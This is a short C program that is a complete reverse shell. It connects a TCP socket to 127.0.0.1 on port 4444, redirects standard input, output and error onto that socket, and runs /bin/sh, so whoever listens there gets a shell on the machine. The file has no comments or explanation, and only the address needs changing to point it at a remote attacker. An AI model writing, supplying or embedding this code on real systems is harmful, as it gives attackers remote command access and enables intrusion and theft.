#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

int main() {
  int sockt;

  struct sockaddr_in sa = {0};
  sa.sin_family = AF_INET;
  sa.sin_port = htons(4444);
  sa.sin_addr.s_addr = inet_addr("127.0.0.1");
  
  sockt = socket(AF_INET, SOCK_STREAM, 0);
  connect(sockt, (struct sockaddr*)&sa, sizeof(sa));
  
  dup2(sockt, 0);
  dup2(sockt, 1);
  dup2(sockt, 2);

  char *argv[] = {"/bin/sh", NULL};
  execve("/bin/sh", argv, NULL);

  return 0;
}
